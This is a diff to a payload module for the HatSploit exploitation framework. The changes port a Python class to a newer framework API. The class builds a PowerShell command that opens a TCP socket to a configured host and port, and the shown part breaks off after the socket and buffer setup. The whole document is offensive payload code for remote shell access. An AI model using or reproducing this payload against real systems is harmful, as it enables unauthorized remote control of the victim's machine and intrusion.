@@ -3,10 +3,10 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__()
 
@@ -24,12 +24,9 @@ class HatSploitPayload(Payload):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
         source = (
-            f"$a='{remote_host}';"
-            f"$b={remote_port};"
+            f"$a='{self.rhost.value}';"
+            f"$b={self.rport.value};"
             ""
             "$c=New-Object system.net.sockets.tcpclient;"
             "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
